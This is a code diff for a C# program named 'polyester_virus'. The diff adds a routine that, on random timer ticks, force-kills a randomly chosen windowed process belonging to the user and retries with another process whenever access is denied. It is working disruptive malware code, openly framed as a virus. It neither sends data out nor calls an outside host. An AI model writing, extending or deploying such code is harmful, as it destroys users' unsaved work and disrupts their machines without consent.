@@ -73,9 +73,51 @@ namespace polyester_virus
                         UseShellExecute = false
                     });
                 }
+                if (Random.Shared.Next(40) == 1)
+                {
+                    KillRandomWindowProcess();
+                }
             };
             timer.Start();
             Application.Run();
+        }
+
+        static bool KillRandomWindowProcess()
+        {
+            var processes = Process.GetProcesses()
+                .Where(p =>
+                {
+                    try
+                    {
+                        return p.Id != Environment.ProcessId &&
+                               p.MainWindowHandle != nint.Zero;
+                    }
+                    catch
+                    {
+                        return false;
+                    }
+                })
+                .OrderBy(_ => Guid.NewGuid());
+
+            foreach (Process? process in processes)
+            {
+                try
+                {
+                    process.Kill();
+                    process.WaitForExit(2000);
+                    return true;
+                }
+                catch (UnauthorizedAccessException)
+                {
+                    // Requires admin — try another process
+                }
+                catch (InvalidOperationException)
+                {
+                    // Process already exited — try another process
+                }
+            }
+
+            return false;
         }
     }
 }
